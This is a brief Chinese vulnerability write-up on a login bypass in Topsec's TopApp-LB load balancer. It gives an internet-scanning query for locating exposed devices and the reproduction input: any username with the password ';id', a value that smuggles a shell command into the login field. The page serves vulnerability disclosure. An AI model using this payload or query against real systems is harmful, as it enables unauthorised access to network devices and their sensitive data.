# 天融信 TopApp-LB 登陆绕过漏洞

## 漏洞描述

天融信负载均衡TopApp-LB系统无需密码可直接登陆，查看敏感信息

## 影响版本

<a-checkbox checked>天融信负载均衡TopApp-LB</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="天融信-TopApp-LB-负载均衡系统"</a-checkbox></br>

## 漏洞复现

在登录页面中输入，账号:`任意账号`  密码:`;id`



![img](../../../.vuepress/public/img/trx-1.png)



成功登录

![img](../../../.vuepress/public/img/trx-2.png)